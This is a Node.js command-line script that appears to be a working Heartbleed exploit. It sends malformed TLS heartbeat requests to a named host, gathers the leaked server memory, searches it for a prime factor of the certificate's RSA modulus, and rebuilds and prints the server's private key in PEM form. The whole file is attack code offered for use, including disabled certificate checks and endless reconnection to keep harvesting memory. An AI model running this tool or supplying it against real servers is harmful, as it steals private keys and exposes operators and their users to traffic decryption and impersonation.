#!/usr/bin/env node
var binding = require('bindings')('heartbleed');
var fs = require('fs');
var tls = require('tls');
var dns = require('dns');
var progress = require('progress');
var bignum = require('bignum');
var asn1 = require('asn1.js');
var rfc3280 = require('asn1.js-rfc3280');

var argv = require('yargs')
    .demand([ 'host' ])
    .alias('h', 'host')
    .alias('p', 'port')
    .alias('c', 'concurrency')
    .default('port', 443)
    .default('concurrency', 1)
    .argv;

process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// Will be lazily loaded
var m;
var e;
var primeSize;
var bar;
var zero = new bignum('0');
var gbCount = 0;

console.error('Heartbleeding %s:%d, stay calm...', argv.host, argv.port);

// Cache hostname's IP to make sure that all requests will go to the same
// place.
dns.lookup(argv.host, function(err, addr) {
  if (err)
    throw err;

  for (var i = 0; i < argv.concurrency; i++)
    heartbleed(addr, argv.port | 0, argv.host);
});

function heartbleed(ip, port, host) {
  var s = tls.connect({
    port: port,
    host: ip,
    ciphers: argv.ciphers || null
  }, function() {
    // Lazily load `m` and `e`
    if (!m) {
      console.error('Cert loaded...');
      var cert = s.getPeerCertificate();
      m = bignum(cert.modulus, 16);
      e = bignum(cert.exponent, 10);
      primeSize = cert.modulus.length / 4;
    }

    setTimeout(function() {
      send();
    }, 10);

    var acc = [], total = 0, sent = 0;
    function send() {
      acc = [];
      total = 0;
      sent = (Math.random() * 65535) | 1;
      s.sslWrap.setHeartbeatLength(sent);
      s.pair.ssl.isSessionReused();
    }
    // NOTE: Will be picked up by isSessionReused
    s.sslWrap = new binding.SSLWrap();
    s.sslWrap.onheartbeat = function(buf) {
      acc.push(buf);
      total += buf.length;

      // Print number of bytes downloaded
      reportProgress(buf.length);

      if (total < sent)
        return;
      var chunk = Buffer.concat(acc, total);

      test(chunk);
      send();
    };
    // Ignore all data
    s.on('data', function() { });

    // Send fake requests to keep connection open
    function fakeReq() {
      if (!s.writable)
        return;
      s.write('GET / HTTP/1.1\r\n' +
              'Host: ' + host + '\r\n' +
              'Connection: keep-alive\r\n\r\n', function() {
        setTimeout(fakeReq, 5000);
      });
    }

    fakeReq();
  });
  s.once('error', function(err) {
    // Ignore
  });
  s.once('close', function() {
    heartbleed(ip, port, host);
  });
  s.setTimeout(10000, function() {
    s.destroy();
  });
}

function test(chunk) {
  var size = primeSize;
  for (var i = 0; i < chunk.length - size - 1; i += 8) {
    // Ignore even numbers, and ones that are not terminating with `0`
    if (chunk[i] % 2 === 0 || chunk[i + size] !== 0)
      continue;
    var p = chunk.slice(i, i + size);

    // Skip completely empty chunks
    for (var j = p.length - 1; j >= 0; j--)
      if (p[j] !== 0)
        break;
    if (j < 0)
      continue;

    // Skip `ones`
    if (j == 0 && p[0] == 1)
      continue;

    var prime = bignum.fromBuffer(p, {
      endian: 'little',
      size: 'auto'
    });
    if (m.mod(prime).eq(zero)) {
      console.error('Found key at offset: %d!', i);
      console.log('The prime is: ' + prime.toString(16) + '\n');
      console.log('The private key is:\n' + getPrivateKey(prime, m) + '\n');

      process.exit();
    }
  }
}

var RSAPrivateKey = asn1.define('RSAPrivateKey', function() {
  this.seq().obj(
    this.key('version').int(),
    this.key('modulus').int(),
    this.key('publicExponent').int(),
    this.key('privateExponent').int(),
    this.key('prime1').int(),
    this.key('prime2').int(),
    this.key('exponent1').int(),
    this.key('exponent2').int(),
    this.key('coefficient').int()
  );
});

function getPrivateKey(p1, m) {
  var p2 = m.div(p1);

  var dp1 = p1.sub(1);
  var dp2 = p2.sub(1);
  var phi = dp1.mul(dp2);

  var d = e.invertm(phi);
  var exp1 = d.mod(dp1);
  var exp2 = d.mod(dp2);
  var coeff = p2.invertm(p1);

  var buf = RSAPrivateKey.encode({
    version: 0,
    modulus: m,
    publicExponent: e,
    privateExponent: d,
    prime1: p1,
    prime2: p2,
    exponent1: exp1,
    exponent2: exp2,
    coefficient: coeff
  }, 'der');

  buf = buf.toString('base64');
  // Wrap buf at 64 column
  var lines = [ '-----BEGIN RSA PRIVATE KEY-----' ];
  for (var i = 0; i < buf.length; i += 64)
    lines.push(buf.slice(i, i + 64));
  lines.push('-----END RSA PRIVATE KEY-----', '');
  return lines.join('\n');
}

function reportProgress(num) {
  // Create 1gb progress bar
  if (!bar) {
    var range = gbCount + ' - ' + (gbCount + 1) + ' GB';
    bar = new progress('  searching ' + range +
                       ' [:bar] :percent :elapseds ETA: :etas', {
      width: 40,
      total: 1024 * 1024 * 1024,
      clear: true
    });
  }
  bar.tick(num);
  if (bar.complete) {
    gbCount++;
    bar = null;
  }
}
